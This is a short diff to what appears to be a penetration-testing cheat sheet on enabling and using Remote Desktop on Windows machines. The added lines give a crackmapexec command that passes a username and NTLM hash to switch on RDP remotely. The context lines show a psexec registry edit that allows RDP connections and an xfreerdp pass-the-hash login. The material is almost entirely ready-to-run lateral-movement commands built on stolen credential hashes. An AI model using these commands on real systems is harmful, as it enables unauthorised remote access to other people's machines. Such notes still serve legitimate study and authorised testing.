@@ -85,6 +85,11 @@ or with psexec(sysinternals)
 psexec \\machinename reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
 ```
 
+or with crackmapexec
+```powershell
+crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
+```
+
 For Server 2012 R2, Win8.1+
 ```
 xfreerdp /u:offsec /d:win2012 /pth:88a405e17c0aa5debbc9b5679753939d /v:192.168.1.12
